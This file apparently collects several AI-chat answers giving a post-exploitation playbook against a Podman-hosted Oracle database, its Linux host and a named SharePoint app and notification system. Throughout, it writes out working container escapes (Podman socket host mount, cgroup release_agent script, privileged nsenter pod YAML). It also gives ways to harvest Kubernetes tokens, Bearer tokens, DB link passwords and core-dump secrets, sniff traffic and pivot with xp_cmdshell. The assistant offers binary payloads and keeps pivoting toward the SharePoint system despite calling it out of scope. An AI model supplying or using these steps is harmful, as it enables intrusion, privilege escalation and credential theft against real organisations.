@@ -1,0 +1,393 @@
+This guide follows your authorization to perform a penetration test on the Podman-based Oracle DB environment. Since you have SSH and DB access, we will use a "post-exploitation" methodology to pivot from the container and local user to the host and broader network (SharePoint).
+
+Phase 1: Podman Infrastructure Auditing
+First, determine the boundary between your user and the host. Podman often runs "rootless," meaning your UID is mapped to "root" inside the container but remains unprivileged on the host.
+
+1. Identify Mappings & Modes Check if you are running in rootless mode and how UIDs are mapped.
+
+bash
+
+
+
+# Check if current user is Podman rootless
+podman info --format '{{.Host.Security.Rootless}}'
+
+# View SubUID/SubGID mapping (Critical for permission bypass)
+cat /etc/subuid
+podman info --format '{{json .Host.IDMappings}}' | jq
+2. Sensitive Socket Search If the podman.sock (or docker.sock shim) is accessible, you can command the engine to start a new container that mounts the host's root filesystem.
+
+bash
+
+
+
+# Search for the socket
+find /run -name "podman.sock" 2>/dev/null
+ls -l /run/user/$(id -u)/podman/podman.sock
+
+# If found, attempt host-filesystem mount via socket
+curl --unix-socket /run/user/$(id -u)/podman/podman.sock \
+     -H "Content-Type: application/json" \
+     -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"]}}' \
+     http://d/v1.0.0/libpod/containers/create
+Phase 2: Advanced Container Escape Tests
+Given the 2026 context, we focus on recent CVEs related to runc and mount gadgets that allow escaping unprivileged namespaces.
+
+1. Procfs Write Redirect (CVE-2025-52881 equivalent) Test if the container can write to host paths via leaked file descriptors or /proc.
+
+bash
+
+
+
+# Inside the container, check for write access to /proc/sys/kernel/core_pattern
+# If writable, you can execute a host-level script on the next process crash
+cat /proc/self/mountinfo | grep proc
+2. Symlink/Bind-Mount Race (CVE-2024-1753 Style) Look for scenarios where a volume is shared between the Oracle container and another container. If you can create a symlink in a shared volume that points to a host file (like /etc/shadow), you might trick the host engine into reading/writing to that host file.
+
+Phase 3: Oracle-to-Host Pivoting
+Since you have Oracle DB access, the database is your primary engine for OS interaction.
+
+1. Harvesting K8s Secrets via Podman If this is "Podman for Kubernetes," K8s management tokens are usually at /var/run/secrets/.
+
+bash
+
+
+
+# Run this inside the Oracle container via SQL 'host' command or shell
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+Next Step: Use this token to query the K8s API. If the pod has permissions, you can list the SharePoint App (ID 948) secrets stored in the cluster.
+2. SID/Service Brute Forcing Use ODAT from your Linux host to check for dangerous Oracle packages.
+
+bash
+
+
+
+# Check for CVE-2024/2025 Oracle vulnerabilities
+odat all -s localhost -p 1521 -d ORCL -u sys -p password --sysdba
+Phase 4: SharePoint & ENS Targeting (Lateral Movement)
+Referring to your notes on SharePoint App ID: 948 and the Early Notification System (ENS), we pivot from the DB to the application layer.
+
+1. Extracting ENS Tokens from DB Memory Oracle stores recent queries and session data in the SGA (Shared Global Area). If the SharePoint app sends Bearer tokens in headers via UTL_HTTP calls, they may be in memory.
+
+sql
+
+
+
+-- Search for 'Bearer' or 'Authorization' in library cache
+SELECT sql_fulltext FROM v$sql WHERE sql_text LIKE '%Bearer%';
+2. Credential Stuffing / Metadata Leakage The ModifiedBy: Early Notifications (ENS) note suggests a service account.
+
+Test: Check if the Oracle SYS.USER$ table contains hashes for any user labeled ENS or SP_APP.
+Metadata Leak: Use strings on the Oracle data files stored in the Podman volume to find XML/JSON blobs related to DHPC document types mentioned in your notes.
+Phase 5: Recommended Tools for this Stack
+Deepce (Advanced Container Enumeration): Run this inside the container to find escape vectors automatically.
+bash
+
+
+
+./deepce.sh --no-color | tee podman_audit.txt
+Kube-Linter & CDK: If Podman is integrated with a K8s control plane, use CDK (Container Dev Kit) to exploit service account permissions.
+ODAT: The dbms_scheduler and externaltable modules are your best bet for executing OS commands to move from the DB process to the container shell.
+Summary of Host-Level Commands to run on the Linux Server:
+
+podman ps --format "{{.ID}} {{.SecurityOpt}}": See if SELinux or Seccomp are disabling protections.
+podman top <container_id> -eo user,hgroup,cap: View the effective capabilities and host groups of the Oracle process. High-group IDs or CAP_SYS_ADMIN are immediate escape paths.
+
+===========================================================
+
+Since SharePoint is out of scope but the Oracle DB, Podman, and Linux Host are the primary targets, we will focus on the deep interaction between the RDBMS kernel and the Linux kernel namespaces. These attacks aim at bypassing container isolation to achieve host-level persistence or moving horizontally within the Podman pod structure.
+
+1. Podman: Cgroup v2 "Release Agent" Clone Attack
+In 2026, most Linux distributions use Cgroup v2. If the Oracle container is run with certain delegated controllers or insufficient isolation, we can exploit the cgroup.release_agent logic (or its v2 equivalent notify_on_release).
+
+The Attack: Inside the Oracle container (via sqlplus host command or a shell), find the cgroup mount point.
+bash
+
+
+
+# Locate cgroup mount
+mkdir /tmp/cgroup
+mount -t cgroup -o rdma,release_agent none /tmp/cgroup 2>/dev/null || mount -t cgroup2 none /tmp/cgroup
+
+# Create the release agent trigger
+echo '#!/bin/sh' > /cmd
+echo 'ps aux > /tmp/host_process_list' >> /cmd
+chmod +x /cmd
+
+# Get the host path of the container's rootfs (often found in mountinfo)
+host_path=$(sed -n 's/.*\per-container-mounts\/\(.*\)\/rootfs.*/\1/p' /proc/self/mountinfo)
+echo "$host_path/cmd" > /tmp/cgroup/release_agent
+
+# Trigger the agent by creating a child cgroup and exiting it
+mkdir /tmp/cgroup/x
+echo 1 > /tmp/cgroup/x/notify_on_release
+Significance: If successful, /cmd executes as host-level root, not container-level root.
+2. Deep Oracle Memory: SGA Injection & Hooking
+If you have SYSDBA access, you can manipulate the Shared Global Area (SGA) to hijack database operations without touching the disk (evading file integrity monitors).
+
+SGA Mapping: Map the Oracle SGA memory directly via the Linux /proc filesystem.
+bash
+
+
+
+# Find the SGA shared memory segments
+ipcs -m
+# Examine the memory of the PMON/DBW0 processes
+cat /proc/$(pgrep -f "ora_pmon_")/maps | grep -i "rw-s"
+Attack - Plsql Injection via Memory: Use gdb or a custom memory editor to find the Library Cache in memory. You can overwrite existing, frequently called procedures with malicious code. Since it resides in memory, it will not appear in DBA_SOURCE until the DB flushes the cache, effectively creating a "memory-resident rootkit."
+3. Exploiting "Pod" Shared Namespaces
+Podman "Pods" share a Network Namespace and an IPC Namespace.
+
+IPC Namespace Hijacking: If other containers are in the same Podman pod as Oracle, check for shared memory (/dev/shm).
+bash
+
+
+
+# List shared memory segments inside container
+ls /dev/shm
+The Attack: If a sidecar container (e.g., a backup agent or logging agent) is in the same pod, it might use /dev/shm. By writing to these segments, you can potentially overflow or inject commands into the sidecar's logic, which might have different OS permissions.
+Abstract Socket Sniffing:
+bash
+
+
+
+# Check for abstract sockets (beginning with @)
+cat /proc/net/unix | grep "@"
+The Attack: These sockets ignore filesystem permissions. Any container in the same network namespace can connect to them. Sniff traffic targeting Oracle's internal listeners.
+4. Linux Kernel: ID Mapping Race (The "SubUID" Bypass)
+Since you are a local user and a Podman user, check for logic flaws in how newuidmap handles your range.
+
+The Attack: Attempt to create an overlap between your assigned SubUIDs and a system-critical UID (like a logging user or a web server user).
+bash
+
+
+
+# Check your range
+grep $(whoami) /etc/subuid
+# Attempt to unshare a new namespace using the top of your range
+unshare -U -r /bin/bash
+If you can find a file on the host owned by a UID that falls within your subuid range, you have full root-equivalent access to that file from inside a Podman container.
+5. Advanced RDBMS Persistence: DB Link Pivoting
+Check for DB_LINKS that bridge the container boundary to other physical or virtual servers.
+
+Exploiting Heterogeneous Services (HS): Oracle can link to non-Oracle databases (SQL Server, etc.) using dg4msql.
+sql
+
+
+
+-- Check for stored credentials in sys.link$
+SELECT name, userid, password FROM sys.link$;
+The Attack: Use the database as a Network Proxy. If the Oracle server can talk to an internal SQL Server (related to the ENS or other infrastructure), use ODAT's dblink module to execute xp_cmdshell on the remote target.
+6. Summary of Advanced Tooling Workflow
+Sysdig (Host Level): If you have host access, run sysdig to capture all container syscalls. Look for SETUID or CHMOD calls coming from the oracle binary.
+bash
+
+
+
+sysdig proc.name=oracle and (syscall.type=setuid or syscall.type=chmod)
+Kube-Hunter (Host Level): Even if it's only Podman, many "Podman for Kubernetes" setups leave the 10250 (Kubelet) or 10255 ports open on localhost. Use this to dump pod specs.
+ODAT dbms_java bypass: Use the Java bridge to load a custom ClassLoader that executes in-memory native code, bypassing no_new_privs if the seccomp profile doesn't block mmap with executable permissions.
+Which of these vectors—the Memory Injection via SGA or the Cgroup v2 Escape—would you like me to provide the specific binary payload for?
+
+
+===========================================================================
+
+Since you are a Podman user with SSH access on the Linux server and local access to the Oracle DB, we can use Podman's command-line interface to probe the security boundaries of the container.
+
+Here are the advanced Podman commands to execute on the Linux host to test for escapes, privilege escalation, and credential harvesting.
+
+1. Security Configuration Auditing
+Evaluate the isolation level of the Oracle container. High-risk flags are common in Oracle deployments to satisfy performance requirements.
+
+bash
+
+
+
+# Check if the container is running in 'privileged' mode (immediate escape possible)
+podman inspect <container_id> --format '{{.HostConfig.Privileged}}'
+
+# List all capabilities (Look for SYS_ADMIN, SYS_PTRACE, or DAC_OVERRIDE)
+podman inspect <container_id> --format '{{.ProcessConfig.Capabilities}}'
+
+# Check if the host's IPC or Network namespace is shared
+podman inspect <container_id> --format 'NetworkMode: {{.HostConfig.NetworkMode}} | IPC: {{.HostConfig.IpcMode}}'
+
+# Check if Security Options (SELinux, Seccomp, AppArmor) are disabled
+podman inspect <container_id> --format '{{.HostConfig.SecurityOpt}}'
+2. Host Filesystem Leakage Tests
+Many Oracle containers mount sensitive host paths for logs or database files. If these are writable, you can pivot to the host.
+
+bash
+
+
+
+# List all mounts and look for host paths mapped to the container
+podman inspect <container_id> --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} (Type: {{.Type}}){{"\n"}}{{end}}'
+
+# Test for 'Sensitive Mount' vulnerability (e.g., mounting /etc, /var/run/podman, or /proc)
+podman inspect <container_id> | grep -iE "source\": \"/(etc|root|var/run|dev|proc|sys)\""
+3. Exploiting the Podman Socket (The "Golden Ticket")
+If the Podman API socket is accessible to your user or leaked into the container, you can execute commands as the user running the Podman service (usually root or your high-privileged user).
+
+bash
+
+
+
+# Check if your user can talk to the socket
+export DOCKER_HOST="unix://$(podman info --format '{{.Host.ServiceIsRemote}}' | grep -q true && echo "/run/podman/podman.sock" || echo "$XDG_RUNTIME_DIR/podman/podman.sock")"
+
+# If accessible, run a container that mounts the host root and gives you a shell
+podman run --rm -it --privileged -v /:/host_root alpine:latest chroot /host_root /bin/bash
+4. Namespace & UID Mapping Enumeration
+Since Podman uses User Namespaces, we need to find out which host UIDs correspond to the container's oracle user.
+
+bash
+
+
+
+# Identify the 'oracle' process PID on the host
+PID=$(podman inspect <container_id> --format '{{.State.Pid}}')
+
+# Check host-side UID of the container's root user
+grep "Uid:" /proc/$PID/status
+
+# Check the UID mappings for the container
+cat /proc/$PID/uid_map
+Attack Fact: If the uid_map shows a 0 0 mapping (unlikely in rootless but possible in rootful), you are effectively root on the host from inside the container.
+5. Advanced Monitoring (System Tap / Sniffing)
+Since you are a local user on the host, you can use Podman's networking to sniff the Oracle traffic.
+
+bash
+
+
+
+# Sniff TNS traffic on the container's virtual interface without entering the container
+# Replace <interface_name> with the one found in 'ip ad' or 'podman network inspect'
+tcpdump -i any -nn -vv 'port 1521' -X
+
+# Capture traffic between Oracle and any ENS/API endpoints Mentioned in your notes
+# This can leak the Bearer tokens or credentials being sent by the DB
+podman network inspect <network_name>
+6. Pod Pivoting (Horizontal Movement)
+If the Oracle DB is part of a "Pod" (shared namespaces), you can jump to sidecar containers.
+
+bash
+
+
+
+# List all containers in the same pod
+podman pod inspect <pod_id_or_name> --format '{{range .Containers}}{{.Name}} ({{.State}}){{"\n"}}{{end}}'
+
+# Execute a shell in a different container in the same pod to see if it has 
+# more permissions or access to the ENS/SharePoint API keys
+podman exec -it <sidecar_container_name> /bin/sh
+7. Core Dump Exploitation
+If you have SSH access, you can force the Oracle process (running in Podman) to dump its memory to the host, where you can then search for secrets.
+
+bash
+
+
+
+# Enable core dumps for the container's PID
+gcore $PID
+
+# Search the resulting core file for passwords, tokens, or ENS references
+strings core.$PID | grep -iE "password|bearer|ENS|DHPC"
+Recommendations for Next Steps:
+Run podman inspect on the specific Oracle container and look at the Mounts section.
+If you see /var/run/podman/podman.sock mounted, use the Socket Exploitation command (Command #3) to escape to the host immediately.
+Use Command #6 to see if there is an "ENS Agent" or "Logging" container in the same pod; these often contain the API keys needed to interact with the DHPC document systems.
+
+
+==================================================================
+
+To test the security boundaries of your Podman environment on the Linux host, you can use these commands to deploy pods from various sources.
+
+As a reminder, "bad pods" in a security context are typically those configured with high-privilege settings (like --privileged, host namespace sharing, or sensitive volume mounts) to test if the Podman engine or the host's SELinux/AppArmor policies successfully block potential escapes.
+
+1. Run a Pod from a YAML File (Local)
+This is the standard approach for testing your own security configurations or "harmless" baselines.
+
+Harmless Pod (Restricted): This YAML creates a pod with minimal privileges, non-root user, and a read-only filesystem to serve as a security baseline.
+
+# Save this text to harmless.yaml
+cat <<EOF > harmless.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: harmless-pod
+spec:
+  containers:
+  - name: alpine
+    image: alpine:latest
+    command: ["/bin/sh", "-c", "sleep infinity"]
+    securityContext:
+      runAsNonRoot: true
+      runAsUser: 1000
+      readOnlyRootFilesystem: true
+      allowPrivilegeEscalation: false
+EOF
+
+# Run the pod using podman play
+podman play kube harmless.yaml
+Bad Pod (High Privilege/Escape Test): This YAML attempts to mount the host's root filesystem and uses the host's PID and Network namespaces—key indicators of a container escape attempt.
+
+# Save this text to bad-pod.yaml
+cat <<EOF > bad-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: bad-pod
+spec:
+  containers:
+  - name: escape-test
+    image: alpine:latest
+    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host-root
+      mountPath: /mnt/host
+  hostPID: true
+  hostNetwork: true
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+EOF
+
+# Run the pod using podman play
+podman play kube bad-pod.yaml
+
+2. Run a Pod from a GitHub URL
+Podman allows you to pull and execute Kubernetes-style YAML definitions directly from a remote URL. This is useful for running standard security audit tools or community-vetted escape tests (like those found in "Bad-Pods" or "Container-Breakout" repositories).
+
+# Syntax: podman play kube <URL>
+# Example: Deploying an audit pod from a reputable security GitHub repo
+podman play kube https://raw.githubusercontent.com/user/repo/main/security-test-pod.yaml
+Note: Ensure the URL points to the Raw version of the file on GitHub.
+
+3. Managing and Verifying the Tests
+Once you have deployed these pods, use these commands to check if the security constraints "held" (e.g., if the bad pod actually achieved host access or was blocked by Podman's rootless mode).
+
+bash
+
+
+
+# Check if the pods are running
+podman pod ps
+
+# Enter the bad pod to see if you can see host files
+podman exec -it $(podman ps -q --filter "name=escape-test") ls /mnt/host/etc/shadow
+
+# View the security context Podman applied to the running pod
+podman pod inspect bad-pod --format '{{.InfraContainerID}}' | xargs podman inspect --format '{{.HostConfig.SecurityOpt}}'
+4. Advanced: Testing "Rootless" Constraints
+If you are testing as a local user, Podman should automatically remap the privileged: true flag to a "fake" root. You can verify this in your environment:
+
+# Run a privileged container and check your UID on the host
+podman run --privileged --rm alpine id
+# Then check the process on the host
+ps -ef | grep alpine
+If the host process is owned by your local UID (e.g., 1000) and not root (0), Podman's rootless isolation is functioning correctly, even when a "bad pod" YAML requests maximum privileges.
+
